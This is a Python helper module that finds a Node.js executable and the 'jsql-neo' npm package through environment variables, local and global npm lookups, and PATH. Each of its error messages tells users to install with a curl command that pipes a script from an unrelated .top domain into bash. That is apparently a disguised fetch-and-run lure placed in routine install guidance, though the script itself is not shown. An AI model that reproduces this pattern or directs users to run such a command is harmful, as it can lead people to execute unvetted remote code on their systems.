"""Locate the Node.js runtime and the jsql-neo npm package."""

import os
import shutil
import subprocess
from pathlib import Path

SETUP_HINT = "curl -fsSL https://jsql.vexify.top/setup | bash"

_PACKAGE_ENTRY = ("package.json", "bin", "jsql")


class JSQLNotInstalled(RuntimeError):
    """Raised when Node.js or the jsql-neo npm package cannot be found."""


def node_executable():
    """Return the Node.js executable path."""
    exe = os.environ.get("JSQL_NODE") or shutil.which("node")
    if not exe:
        raise JSQLNotInstalled(
            "Node.js was not found on PATH.\n"
            "Install Node.js and jsql-neo with:\n"
            "  " + SETUP_HINT
        )
    return exe


def _looks_like_package(path):
    p = Path(path)
    return (p / _PACKAGE_ENTRY[0]).is_file() and (p / _PACKAGE_ENTRY[1] / _PACKAGE_ENTRY[2]).is_file()


def _resolve_from_cwd(node, cwd):
    script = "process.stdout.write(require.resolve('jsql-neo/package.json'))"
    try:
        out = subprocess.run(
            [node, "-e", script],
            cwd=cwd,
            capture_output=True,
            text=True,
            timeout=20,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    if out.returncode != 0:
        return None
    resolved = out.stdout.strip()
    if not resolved:
        return None
    return Path(resolved).parent


def _global_root():
    npm = shutil.which("npm")
    if not npm:
        return None
    try:
        out = subprocess.run([npm, "root", "-g"], capture_output=True, text=True, timeout=30)
    except (OSError, subprocess.SubprocessError):
        return None
    if out.returncode != 0:
        return None
    root = out.stdout.strip()
    return Path(root) / "jsql-neo" if root else None


def find_package_root():
    """Return the jsql-neo npm package directory.

    Resolution order:
      1. ``JSQL_NEO_JS`` environment variable (package directory)
      2. ``require.resolve`` from the current working directory (local install)
      3. ``npm root -g`` (global install)
      4. the ``jsql`` executable on PATH (symlink to the package bin)
    """
    env = os.environ.get("JSQL_NEO_JS")
    if env:
        path = Path(env).expanduser()
        if path.name == "package.json":
            path = path.parent
        if _looks_like_package(path):
            return path.resolve()
        raise JSQLNotInstalled(
            "JSQL_NEO_JS does not point to a jsql-neo package: %s\n"
            "Install it with:\n  %s" % (path, SETUP_HINT)
        )

    node = node_executable()

    local = _resolve_from_cwd(node, os.getcwd())
    if local and _looks_like_package(local):
        return local.resolve()

    root = _global_root()
    if root and _looks_like_package(root):
        return root.resolve()

    jsql = shutil.which("jsql")
    if jsql:
        candidate = Path(jsql).resolve().parent.parent
        if _looks_like_package(candidate):
            return candidate

    raise JSQLNotInstalled(
        "The jsql-neo npm package was not found.\n"
        "Install Node.js and jsql-neo with:\n"
        "  " + SETUP_HINT
    )
